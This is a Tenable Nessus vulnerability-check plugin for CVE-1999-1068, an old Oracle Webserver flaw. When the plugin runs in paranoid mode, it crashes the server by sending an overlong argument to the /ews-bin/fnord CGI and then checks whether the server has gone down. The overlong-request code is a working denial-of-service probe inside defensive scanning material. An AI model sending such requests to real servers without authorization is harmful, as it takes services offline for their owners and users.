#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10171);
 script_version ("$Revision: 1.33 $");

 script_cve_id("CVE-1999-1068");
 script_xref(name:"OSVDB", value:"9413");

 script_name(english:"Oracle Webserver PL/SQL Stored Procedure GET Request DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by denial
of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote web server crash by 
supplying a too long argument to the cgi /ews-bin/fnord. 
An attacker may use this flaw to prevent your customers 
to access your website." );
 script_set_attribute(attribute:"solution", value:
"Remove this CGI." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_set_attribute(attribute:"plugin_publication_date", value: "1999/07/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "1997/07/23");
 script_set_attribute(attribute:"plugin_type", value: "remote");
 script_cvs_date("$Date: 2014/04/25 22:31:27 $");
 script_end_attributes();
 
 script_summary(english:"Crashes the remote OWS");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 1999-2014 Tenable Network Security, Inc.");
 script_family(english:"Databases");
 script_dependencie("http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2)
 exit(0, "This script is prone to FP and only runs in 'paranoid' mode");

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(1, "the web server on port "+port+" is dead");

res = is_cgi_installed3(item:"/ews-bin/fnord", port:port);
if(res)
{
  request = string("/ews-bin/fnord?foo=", crap(2048));
  is_cgi_installed3(item:request, port:port);
  sleep(5);
  if (http_is_dead(port: port, retry: 3)) security_warning(port);
}

